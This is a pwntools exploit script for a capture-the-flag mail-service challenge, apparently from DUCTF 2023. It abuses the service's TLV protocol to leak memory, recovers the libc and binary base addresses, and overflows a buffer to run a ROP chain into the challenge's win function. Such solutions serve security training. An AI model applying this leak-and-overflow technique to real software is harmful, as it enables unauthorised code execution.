#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./binary_mail", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc 2023.ductf.dev 30011"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

TAG_RES_MSG = 0
TAG_RES_ERROR = 1
TAG_INPUT_REQ = 2
TAG_INPUT_ANS = 3
TAG_COMMAND = 4
TAG_STR_PASSWORD = 5
TAG_STR_FROM = 6
TAG_STR_MESSAGE = 7


def parse_tlv():
    global tlv_debug
    fmt = "=IQ"
    tag, length = struct.unpack(fmt, io.recv(struct.calcsize(fmt)))
    data = io.recv(length)
    if not debug:
        return data
    if tag == 0:
        print(f"+>: {data}")
    elif tag == 1:
        print(f"!>: {data}")
    elif tag == 2:
        print(f"r<: {data}")
    elif tag == 3:
        print(f"a<: {data}")
    elif tag == 4:
        print(f"cmd: {data}")
    elif tag == 5:
        print(f"password: {data}")
    elif tag == 6:
        print(f"from: {data}")
    elif tag == 7:
        print(f"message: {data}")
    return data


def input_ans(ans):
    data = struct.pack("=IQ", TAG_INPUT_ANS, len(ans))
    io.send(data + ans)


def register_user(username, password):
    cmd = b"register"
    data = struct.pack("=IQ", TAG_COMMAND, len(cmd))
    io.send(data + cmd)
    parse_tlv()
    input_ans(username)
    r = parse_tlv()
    if b"user already exists" in r:
        return
    input_ans(password)
    parse_tlv()


def send_mail(username, password, recipient, message):
    log.info(f"sending from {username} to {recipient}")
    cmd = b"send_mail"
    data = struct.pack("=IQ", TAG_COMMAND, len(cmd))
    io.send(data + cmd)
    parse_tlv()
    input_ans(username)
    parse_tlv()
    input_ans(password)
    parse_tlv()
    input_ans(recipient)
    parse_tlv()
    input_ans(message)
    parse_tlv()


def view_mail(username, password):
    log.info(f"viewing {username}")
    cmd = b"view_mail"
    data = struct.pack("=IQ", TAG_COMMAND, len(cmd))
    io.send(data + cmd)
    parse_tlv()
    input_ans(username)
    parse_tlv()
    input_ans(password)
    r = parse_tlv()
    return r


tlv_debug = True
io.recvuntil(b"v0.1.0\n")

u1 = b"a"
p1 = b"a"
register_user(u1, p1)

u2 = cyclic(127)
p2 = b"p"
register_user(u2, p2)

"""
create a fake message data on the original message itself
"""
pad = 114
msg = cyclic(0x400)
payload = struct.pack("=IQ", TAG_STR_MESSAGE, len(msg))

"""
u1 is sender, u2 is recipient
len(u1) < len(u2) for leaking memory
"""
send_mail(u1, p1, u2, (cyclic(114) + payload + msg)[:0x3ff])

# trigger the leak
r = view_mail(u2, p2)
r = r.split(b"waaixaaiy")
raw_leaks = r[1]
leaks = []

for i in range(0, len(raw_leaks), 8):
    lk = u64(raw_leaks[i:i + 8].ljust(8, b"\x00"))
    leaks.append(lk)
    log.info(f"[{i//8}] {lk=:#x}")

libc_base = leaks[1] - 0x8b415
elf.address = leaks[12] - 0x1e15

"""
create a fake message data on the sender username
"""
payload = struct.pack("=IQ", TAG_STR_MESSAGE, (1 << 64) - 1)
payload += cyclic(0x100)
u3 = (b"a" + payload)[:0x7f]
p3 = b"a"
register_user(u3, p3)

"""
u3 is sender, u1 is recipient
len(u3) > len(u1) for buffer overflow
"""
send_mail(u3, p3, u1, b"z")

payload = cyclic(905)
payload += flat(
    elf.bss(0x400),
    elf.symbols["view_mail"] + 716,  # ret gadget
    elf.symbols["win"],
)
# add another mail to reach `rbp` and `saved rip`
send_mail(u2, p2, u1, payload)

# trigger the bof
view_mail(u1, p1)

io.interactive()
